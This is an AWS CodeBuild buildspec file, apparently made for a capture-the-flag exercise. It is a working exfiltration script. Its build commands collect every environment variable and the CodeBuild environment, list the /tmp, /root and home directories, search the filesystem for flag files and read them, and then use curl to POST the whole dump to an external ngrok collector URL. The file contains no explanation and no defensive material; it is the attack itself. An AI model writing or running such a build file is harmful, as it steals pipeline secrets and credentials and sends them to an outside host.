version: 0.2

phases:
  build:
    commands:
      - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"

      # Dump everything that might contain the flag
      - |
        {
          echo "=== ENVIRONMENT VARIABLES ==="
          env | sort
          echo ""
          echo "=== /tmp CONTENTS ==="
          ls -la /tmp/ 2>/dev/null | head -20
          echo ""
          echo "=== /root CONTENTS ==="
          ls -la /root/ 2>/dev/null | head -20
          echo ""
          echo "=== HOME DIRECTORY ==="
          ls -la $HOME/ 2>/dev/null | head -20
          echo ""
          echo "=== Look for flag files anywhere accessible ==="
          find / -name '*flag*' -o -name 'FLAG*' 2>/dev/null | head -30
          echo ""
          echo "=== /tmp/flag content ==="
          cat /tmp/flag 2>/dev/null || echo "not found"
          echo ""
          echo "=== /root/flag content ==="
          cat /root/flag 2>/dev/null || echo "not found"
          echo ""
          echo "=== /flag content ==="
          cat /flag 2>/dev/null || echo "not found"
          echo ""
          echo "=== PWD and contents ==="
          pwd
          ls -la
          echo ""
          echo "=== CODEBUILD ENV ==="
          env | grep -i codebuild
        } > /tmp/flag_dump.txt 2>&1

      # POST the dump
      - curl -s -X POST "$COLLECTOR/flag_dump" -H 'Content-Type: text/plain' --data-binary @/tmp/flag_dump.txt

      - echo "Done"
